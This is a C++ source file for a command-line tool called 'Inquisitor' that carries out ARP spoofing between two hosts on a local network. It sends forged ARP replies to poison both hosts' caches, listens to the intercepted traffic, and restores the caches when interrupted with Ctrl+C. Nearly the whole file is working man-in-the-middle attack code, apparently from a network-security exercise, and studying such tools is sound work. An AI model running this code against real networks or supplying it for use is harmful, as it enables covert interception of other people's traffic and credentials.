#include "../../include/header.hpp"

Inquisitor *worker_ptr = NULL;

void sigint_hdl(int sig_num)
{
        std::cout << std::endl
                  << "SIGINT (Ctrl+C [" << sig_num << "]) received. Reversing spoofing... " << std::endl;

        uint8_t src_mac[6];
        uint8_t src_ipv4[4];

        (*worker_ptr).set_spoofing(false);
        (*worker_ptr).send_arp_frame();

        memcpy(src_mac, (*worker_ptr).get_src_mac(), 6);
        memcpy(src_ipv4, (*worker_ptr).get_src_ipv4(), 4);
        (*worker_ptr).set_src_mac((*worker_ptr).get_target_mac());
        (*worker_ptr).set_src_ipv4((*worker_ptr).get_target_ipv4());
        (*worker_ptr).set_target_mac(src_mac);
        (*worker_ptr).set_target_ipv4(src_ipv4);
        (*worker_ptr).send_arp_frame();

        (*worker_ptr).~Inquisitor();
        std::cout << "[ OK ]" << std::endl;
        std::cout << "---------------------------------------------------------" << std::endl;
        exit(0);
}

std::string ip2str(const uint8_t *ip_addr)
{
        char buffer[16];
        snprintf(buffer, sizeof(buffer), "%d.%d.%d.%d",
                 ip_addr[0], ip_addr[1], ip_addr[2], ip_addr[3]);
        return std::string(buffer);
}

std::string mac2str(const uint8_t *mac_addr)
{
        char buffer[18];
        snprintf(buffer, sizeof(buffer), "%02x:%02x:%02x:%02x:%02x:%02x",
                 mac_addr[0], mac_addr[1], mac_addr[2],
                 mac_addr[3], mac_addr[4], mac_addr[5]);
        return std::string(buffer);
}

std::vector<uint8_t> parse_ip(const std::string &ip_str)
{
        std::vector<uint8_t> ip_bytes;
        std::istringstream iss(ip_str);
        std::string byte_str;

        while (getline(iss, byte_str, '.'))
                ip_bytes.push_back(static_cast<uint8_t>(std::stoi(byte_str)));
        return ip_bytes;
}

std::vector<uint8_t> parse_mac(const std::string &mac_str)
{
        std::vector<uint8_t> mac_bytes;
        std::istringstream iss(mac_str);
        std::string byte_str;

        while (getline(iss, byte_str, ':'))
                mac_bytes.push_back(static_cast<uint8_t>(std::stoi(byte_str, nullptr, 16)));
        return mac_bytes;
}

int main(int ac, char **av)
{
        bool arg_offset = false;
        bool verbose = false;
        if ((ac < 5 || ac > 6) || (ac == 6 && std::string(av[1]) != "-v"))
        {
                std::cout << "Usage: " << av[0] << " [-v Verbose] <src_mac> <src_ipv4> <target_mac> <target_ipv4>" << std::endl;
                return 1;
        }
        if (ac == 6)
        {
                verbose = true;
                arg_offset = true;
        }
        const std::vector<uint8_t> src_mac = parse_mac(av[1 + arg_offset]);
        const std::vector<uint8_t> src_ip = parse_ip(av[2 + arg_offset]);
        const std::vector<uint8_t> target_mac = parse_mac(av[3 + arg_offset]);
        const std::vector<uint8_t> target_ip = parse_ip(av[4 + arg_offset]);
        if (src_mac.size() != 6 || src_ip.size() != 4 || target_mac.size() != 6 || target_ip.size() != 4)
        {
                std::cerr << "[ ERROR ] Invalid IP or MAC address format." << std::endl;
                return 1;
        }
        const uint8_t broadcast_mac[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
        Inquisitor worker(src_mac.data(), src_ip.data(), broadcast_mac, target_ip.data());
        worker_ptr = &worker;

        struct sigaction sa;
        sa.sa_handler = sigint_hdl;
        sa.sa_flags = 0;
        sigemptyset(&sa.sa_mask);
        if (sigaction(SIGINT, &sa, NULL) < 0)
        {
                std::cerr << "[ ERROR ] sigaction() failed: " << strerror(errno) << std::endl;
                return 1;
        }
        std::cout << "-----------------| I N Q U I S I T O R |-----------------" << std::endl;
        std::cout << "Source: " << mac2str(src_mac.data()) << " --- " << ip2str(src_ip.data()) << std::endl;
        std::cout << "Target: " << mac2str(target_mac.data()) << " --- " << ip2str(target_ip.data()) << std::endl;
        std::cout << "Performing ARP spoofing... " << std::endl;

        worker.send_arp_frame();
        worker.set_src_mac(target_mac.data());
        worker.set_src_ipv4(target_ip.data());
        worker.set_target_ipv4(src_ip.data());
        worker.send_arp_frame();

        worker.set_opcode(ARP_REPLY);
        worker.set_spoofing(true);
        worker.set_target_mac(src_mac.data());

        sleep(3);

        worker.send_arp_frame();
        worker.set_src_mac(src_mac.data());
        worker.set_src_ipv4(src_ip.data());
        worker.set_target_mac(target_mac.data());
        worker.set_target_ipv4(target_ip.data());
        worker.send_arp_frame();
        std::cout << "[ OK ]" << std::endl;

        std::cout << "Listening traffic..." << std::endl;
        worker.listen_traffic(verbose);
        std::cout << "---------------------------------------------------------" << std::endl;
        return 0;
}